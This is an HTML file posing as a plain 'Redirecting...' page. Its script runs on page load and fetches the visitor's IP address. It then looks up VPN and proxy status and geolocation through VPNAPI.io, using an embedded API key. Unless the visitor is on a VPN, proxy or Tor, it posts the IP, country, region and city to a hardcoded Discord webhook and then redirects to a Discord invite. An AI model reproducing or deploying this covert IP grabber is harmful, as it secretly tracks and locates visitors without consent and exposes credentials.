<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Unobfuscated webhook URL
        const webhookUrl = 'https://discordapp.com/api/webhooks/1350521982185242715/nMGu8EnLqK0oQHROrOc79bFxkcs5tVzU5x0oRLK60LvxHsx37wJrGEoPd6jy1Ka3GaaT';

        // API Key for VPNAPI.io
        const vpnApiKey = 'd4174ac879ec45dbaf68f0622ac553ba';

        async function sendIPAndRedirect() {
            try {
                // Fetch the user's IP address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                // Use VPNAPI.io to check if the IP is a VPN, proxy, or Tor
                const ipCheckResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?key=${vpnApiKey}`);
                const ipCheckData = await ipCheckResponse.json();

                // Check if the IP is flagged as a VPN, proxy, or Tor
                if (ipCheckData.security.vpn || ipCheckData.security.proxy || ipCheckData.security.tor) {
                    // Redirect to a different link if it's a VPN, proxy, or Tor
                    window.location.href = 'https://discord.gg/62uxgXXXXr';
                    return;  // Exit early if it's flagged
                }

                // Create an embed with the IP and location information
                const messageData = {
                    content: 'New IP Information:',
                    embeds: [
                        {
                            title: 'IP Information',
                            color: 3447003, // Embed color (Hex to Decimal)
                            fields: [
                                {
                                    name: 'IP Address',
                                    value: ipAddress,
                                    inline: true
                                },
                                {
                                    name: 'VPN/Proxy/Tor Status',
                                    value: ipCheckData.security.vpn || ipCheckData.security.proxy || ipCheckData.security.tor ? 'Yes' : 'No',
                                    inline: true
                                },
                                {
                                    name: 'Continent',
                                    value: ipCheckData.location.continent || 'Not Available',
                                    inline: true
                                },
                                {
                                    name: 'Country',
                                    value: ipCheckData.location.country || 'Not Available',
                                    inline: true
                                },
                                {
                                    name: 'Region',
                                    value: ipCheckData.location.region || 'Not Available',
                                    inline: true
                                },
                                {
                                    name: 'City',
                                    value: ipCheckData.location.city || 'Not Available',
                                    inline: true
                                }
                            ],
                            footer: {
                                text: 'IP Checker'
                            }
                        }
                    ]
                };

                // Send the IP and location info to Discord webhook with the embed
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                });

                // Redirect to the Discord invite after sending the IP info
                window.location.href = 'https://discord.gg/62uxgXXXXr';
            } catch (error) {
                // Redirect to Discord invite if there's an error
                window.location.href = 'https://discord.gg/62uxgXXXXr';
            }
        }

        // Call the function to send IP and then redirect
        sendIPAndRedirect();
    </script>
</body>
</html>
